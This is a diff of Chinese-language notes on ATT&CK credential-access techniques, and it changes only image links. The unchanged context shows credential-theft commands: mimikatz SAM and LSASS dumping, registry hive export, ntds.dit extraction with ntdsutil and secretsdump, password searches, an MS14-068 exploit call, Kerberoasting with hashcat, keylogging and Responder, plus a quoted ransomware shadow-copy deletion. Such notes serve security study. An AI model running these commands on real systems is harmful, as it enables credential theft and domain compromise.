@@ -27,7 +27,7 @@ history -c 彻底清除历史（存在一个问题，就是bash_history文件其
 
 主要说了一些暴力破解的方式，而工具多种多样，一般情况下的爆破可以基于短时间内访问失败次数进行检测。比较有名的就是Hydra了。
 
-![1574317122700](Credential Access.assets/1574317122700.png)
+![1574317122700](Credential%20Access.assets/1574317122700.png)
 
 ## Credential Dumping-T1003
 
@@ -39,7 +39,7 @@ SAM包含主机的本地账户的HAS值（每一台主机中都存在一个SAM�
 
 ​        下载了pwdump7，直接执行exe文件即可
 
-![1574317247983](Credential Access.assets/1574317247983.png)
+![1574317247983](Credential%20Access.assets/1574317247983.png)
 
 ​    **gsecdump**
 
@@ -53,7 +53,7 @@ token::elevate
 lsadump::sam
 ```
 
-![1574317265058](Credential Access.assets/1574317265058.png)
+![1574317265058](Credential%20Access.assets/1574317265058.png)
 
 ​    **secretsdump.py**
 
@@ -64,7 +64,7 @@ Import-module Invoke-PowerDump.ps1
 Invoke-PowerDump
 ```
 
-![1574317328740](Credential Access.assets/1574317328740.png)
+![1574317328740](Credential%20Access.assets/1574317328740.png)
 
 **Reg从注册表中提取SAM**
 
@@ -77,13 +77,13 @@ reg save HKLM\system c:\system
 
 ​    这种方式提取的文件是乱码，明文需要通过samdump2或者mimikatz再提
 
-![1574317367660](Credential Access.assets/1574317367660.png)
+![1574317367660](Credential%20Access.assets/1574317367660.png)
 
 ```
 lsadump::sam /sam:sam /system:system
 ```
 
-![1574317383054](Credential Access.assets/1574317383054.png)
+![1574317383054](Credential%20Access.assets/1574317383054.png)
 
 ### Local Security Authority (LSA) 
 
@@ -101,7 +101,7 @@ NTDS不同于SAM，SAM保存本地，NTDS保存在域控，保存了域内所有
 
 （勒索软件通常会删除卷影副本：C:\Windows\Sysnative\vssadmin.exe"Delete Shadows /All /Quiet）
 
-![1574317582705](Credential Access.assets/1574317582705.png)
+![1574317582705](Credential%20Access.assets/1574317582705.png)
 
 **secretsdump.py**
 
@@ -111,7 +111,7 @@ secretsdump.py在这里的作用是从已经导出的ntds.dit文件中导出明�
 python secretsdump.py -ntds /demo/ntds/ntds.dit -system /demo/ntds/SYSTEM LOCAL
 ```
 
-![1574317609798](Credential Access.assets/1574317609798.png)    
+![1574317609798](Credential%20Access.assets/1574317609798.png)    
 
 **ntdsutil.exe**
 
@@ -121,7 +121,7 @@ python secretsdump.py -ntds /demo/ntds/ntds.dit -system /demo/ntds/SYSTEM LOCAL
 ntdsutil "ac i ntds" "ifm" "create full c:temp" q q
 ```
 
-![1574317634601](Credential Access.assets/1574317634601.png)
+![1574317634601](Credential%20Access.assets/1574317634601.png)
 
 **Invoke-NinjaCopy.ps1**
 
@@ -148,11 +148,11 @@ privilege::debug
 sekurlsa::logonPasswords
 ```
 
-![1574317707084](Credential Access.assets/1574317707084.png)
+![1574317707084](Credential%20Access.assets/1574317707084.png)
 
 上图是在windows server 2008中的截图，在windows server 2012中lsass中已经不存储明文。
 
-![1574318018748](Credential Access.assets/1574318018748.png)
+![1574318018748](Credential%20Access.assets/1574318018748.png)
 
 ## Credentials in Files-T1081
 
@@ -172,7 +172,7 @@ findstr /si password *.xml
 findstr /si password *.ini
 ```
 
-![1574318204038](Credential Access.assets/1574318204038.png)
+![1574318204038](Credential%20Access.assets/1574318204038.png)
 
 ## Credentials in Registry-T1214
 
@@ -193,7 +193,7 @@ reg query HKCU /f password /t REG_SZ /s
 MS14-068.exe -u normal@test.com -s S-1-5-21-1406004368-3818689962-3591297438-1105 -d 192.168.3.100 -p Server1
 ```
 
-![1574318277629](Credential Access.assets/1574318277629.png)
+![1574318277629](Credential%20Access.assets/1574318277629.png)
 
 ## Forced Authentication-T1187
 
@@ -207,7 +207,7 @@ MS14-068.exe -u normal@test.com -s S-1-5-21-1406004368-3818689962-3591297438-110
 
 通过页面（钓鱼邮件等）中嵌入的代码发起SMB请求，然后进行SMB中继操作，或者用于检索文件
 
-![1574318337349](Credential Access.assets/1574318337349.png)
+![1574318337349](Credential%20Access.assets/1574318337349.png)
 
 ## Hooking-T1179
 
@@ -221,7 +221,7 @@ MS14-068.exe -u normal@test.com -s S-1-5-21-1406004368-3818689962-3591297438-110
 3、 应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。
 ```
 
-![1574318455954](Credential Access.assets/1574318455954.png)
+![1574318455954](Credential%20Access.assets/1574318455954.png)
 
 从上图可以更形象的来理解这个过程。
 
@@ -330,11 +330,11 @@ extern "C" {
 
 首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer工具查看发现此时notepad.exe还没有调用Keyhook.dll
 
-![1574318618698](Credential Access.assets/1574318618698.png)
+![1574318618698](Credential%20Access.assets/1574318618698.png)
 
 在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。
 
-![1574318631944](Credential Access.assets/1574318631944.png)
+![1574318631944](Credential%20Access.assets/1574318631944.png)
 
 这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。
 
@@ -353,7 +353,7 @@ extern "C" {
 Get-Keystrokes
 ```
 
-![1574318973123](Credential Access.assets/1574318973123.png)
+![1574318973123](Credential%20Access.assets/1574318973123.png)
 
 ## Input Prompt-T1141
 
@@ -368,7 +368,7 @@ Import-module Invoke-Kerberoast.ps1
 Invoke-kerberoast –outputformat hashcat | fl
 ```
 
-![1574319151262](Credential Access.assets/1574319151262.png)
+![1574319151262](Credential%20Access.assets/1574319151262.png)
 
 然后将得到的内容使用hashcat工具爆破
 
@@ -376,7 +376,7 @@ Invoke-kerberoast –outputformat hashcat | fl
 hashcat64.exe –m 13100 test1.txt password.list --force
 ```
 
-![1574319165232](Credential Access.assets/1574319165232.png)
+![1574319165232](Credential%20Access.assets/1574319165232.png)
 
 ## Keychain-T1142
 
@@ -394,7 +394,7 @@ MACOS
 python2 Responder.py -I eth0
 ```
 
-![1574319221984](Credential Access.assets/1574319221984.png)
+![1574319221984](Credential%20Access.assets/1574319221984.png)
 
 ## Network Sniffing-T1040
 
